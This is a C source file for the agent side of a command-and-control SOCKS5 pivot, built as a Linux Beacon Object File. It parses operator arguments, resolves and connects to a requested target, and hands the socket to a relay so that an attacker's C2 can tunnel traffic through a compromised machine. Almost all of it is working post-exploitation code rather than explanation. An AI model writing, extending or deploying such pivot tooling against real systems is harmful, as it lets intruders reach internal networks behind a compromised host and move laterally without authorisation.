/*
 * socks5.c — the agent half of the C2 SOCKS5 pivot, as a Linux BOF.
 *
 * The C2 owns the SOCKS5 listener. This object owns everything the agent side
 * needs: argument handling, target parsing, name resolution and the dial with
 * its own deadline. Only the byte pump is delegated, to RelaySocket, because a
 * relay outlives this entry point and the loader unmaps the object when it
 * returns (and the RV32 guest is single threaded, so it cannot pump either).
 */

#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

/* How long one candidate address may take to complete its handshake, and how
 * long the relay may stay silent before the agent ends it. */
#define SOCKS5_DIAL_TIMEOUT_MS 20000
#define SOCKS5_RELAY_IDLE_S (15 * 60)

#define ERR_CAP 192

typedef struct {
  char *buffer;
  int length;
  int size;
} datap;

/* The argument block is the Windows COFFLoader wire format: a 4-byte body
 * length followed by length-prefixed values. Parsing it here keeps the object
 * free of the x86-only syscall helpers in bof_common, so the same source also
 * builds for RV32. */
static void BeaconDataParse(datap *parser, char *buffer, int size) {
  if (parser == NULL)
    return;
  parser->buffer = buffer;
  parser->length = 0;
  parser->size = 0;
  if (buffer == NULL || size < 4)
    return;
  int body = 0;
  memcpy(&body, buffer, 4);
  int available = size - 4;
  if (body < 0 || body > available)
    body = available;
  parser->buffer = buffer + 4;
  parser->length = body;
  parser->size = body;
}

static char *BeaconDataExtract(datap *parser, int *size) {
  if (size != NULL)
    *size = 0;
  if (parser == NULL || parser->length < 4)
    return NULL;
  int len = 0;
  memcpy(&len, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  if (len < 0 || len > parser->length)
    return NULL;
  char *out = parser->buffer;
  parser->buffer += len;
  parser->length -= len;
  if (size != NULL)
    *size = len;
  return out;
}

extern void BeaconPrintf(int type, const char *fmt, ...);
/* Hand the connected socket to the C2 stream named by `token`. The relay owns
 * the descriptor from here on and runs on the agent's threads; this call
 * returns as soon as it is running. */
extern int RelaySocket(const char *token, int fd, int idle_seconds, char *err,
                       int err_cap);

/* Split host:port, accepting [v6]:port. Rejects a missing host or port and a
 * port outside 1..65535, so a malformed CONNECT never reaches the resolver. */
static int split_target(const char *target, char *host, size_t host_cap,
                        char *port, size_t port_cap) {
  if (target == NULL || host == NULL || port == NULL || host_cap == 0 ||
      port_cap == 0)
    return -1;

  const char *h = target;
  size_t hlen = 0;
  const char *p = NULL;
  if (target[0] == '[') {
    const char *close_b = strchr(target, ']');
    if (close_b == NULL || close_b == target + 1 || close_b[1] != ':')
      return -1;
    h = target + 1;
    hlen = (size_t)(close_b - h);
    p = close_b + 2;
  } else {
    const char *colon = strrchr(target, ':');
    if (colon == NULL || colon == target)
      return -1;
    hlen = (size_t)(colon - target);
    p = colon + 1;
  }
  if (hlen == 0 || hlen >= host_cap)
    return -1;

  size_t plen = strlen(p);
  if (plen == 0 || plen >= port_cap)
    return -1;
  long value = 0;
  for (size_t i = 0; i < plen; i++) {
    if (p[i] < '0' || p[i] > '9')
      return -1;
    value = value * 10 + (p[i] - '0');
    if (value > 65535)
      return -1;
  }
  if (value < 1)
    return -1;

  memcpy(host, h, hlen);
  host[hlen] = '\0';
  memcpy(port, p, plen + 1);
  return 0;
}

/* Resolve host:port and connect to the first address that answers within
 * SOCKS5_DIAL_TIMEOUT_MS, leaving the socket blocking. Returns the descriptor
 * or -1 with `err` filled in. */
static int dial(const char *host, const char *port, char *err, int err_cap) {
  struct addrinfo hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  struct addrinfo *res = NULL;
  int gai = getaddrinfo(host, port, &hints, &res);
  if (gai != 0) {
    snprintf(err, (size_t)err_cap, "cannot resolve %s: %s", host,
             gai_strerror(gai));
    return -1;
  }

  int fd = -1;
  int last = 0;
  for (struct addrinfo *ai = res; ai != NULL; ai = ai->ai_next) {
    int s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    if (s < 0) {
      last = errno;
      continue;
    }
    /* Non-blocking connect so one unreachable candidate cannot stall the
     * agent's command thread for the kernel's retry budget. */
    int flags = fcntl(s, F_GETFL, 0);
    if (flags < 0 || fcntl(s, F_SETFL, flags | O_NONBLOCK) != 0) {
      last = errno;
      close(s);
      continue;
    }
    int rc = connect(s, ai->ai_addr, ai->ai_addrlen);
    if (rc != 0 && errno == EINPROGRESS) {
      struct pollfd pfd = {s, POLLOUT, 0};
      int prc;
      do {
        prc = poll(&pfd, 1, SOCKS5_DIAL_TIMEOUT_MS);
      } while (prc < 0 && errno == EINTR);
      if (prc == 1) {
        int so_err = 0;
        socklen_t so_len = sizeof(so_err);
        if (getsockopt(s, SOL_SOCKET, SO_ERROR, &so_err, &so_len) == 0 &&
            so_err == 0) {
          rc = 0;
        } else {
          last = so_err != 0 ? so_err : errno;
          rc = -1;
        }
      } else {
        last = prc == 0 ? ETIMEDOUT : errno;
        rc = -1;
      }
    } else if (rc != 0) {
      last = errno;
    }
    if (rc == 0 && fcntl(s, F_SETFL, flags) == 0) {
      fd = s;
      break;
    }
    if (rc == 0)
      last = errno;
    close(s);
  }
  freeaddrinfo(res);

  if (fd < 0)
    snprintf(err, (size_t)err_cap, "cannot connect to %s:%s%s%s", host, port,
             last != 0 ? ": " : "", last != 0 ? strerror(last) : "");
  return fd;
}

void go(char *args, int len) {
  datap parser;
  BeaconDataParse(&parser, args, len);
  char *token = BeaconDataExtract(&parser, NULL);
  char *target = BeaconDataExtract(&parser, NULL);

  if (token == NULL || token[0] == '\0') {
    BeaconPrintf(CALLBACK_ERROR, "socks5: missing proxy stream token");
    return;
  }
  if (target == NULL || target[0] == '\0') {
    BeaconPrintf(CALLBACK_ERROR, "socks5: missing target");
    return;
  }

  char host[256];
  char port[16];
  if (split_target(target, host, sizeof(host), port, sizeof(port)) != 0) {
    BeaconPrintf(CALLBACK_ERROR, "socks5: invalid target %s", target);
    return;
  }

  char err[ERR_CAP] = {0};
  int fd = dial(host, port, err, (int)sizeof(err));
  if (fd < 0) {
    BeaconPrintf(CALLBACK_ERROR, "socks5: %s",
                 err[0] != '\0' ? err : "dial failed");
    return;
  }

  int rc = RelaySocket(token, fd, SOCKS5_RELAY_IDLE_S, err, (int)sizeof(err));
  if (rc != 0) {
    BeaconPrintf(CALLBACK_ERROR, "socks5: %s",
                 err[0] != '\0' ? err : "relay failed");
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "socks5: relay started");
}
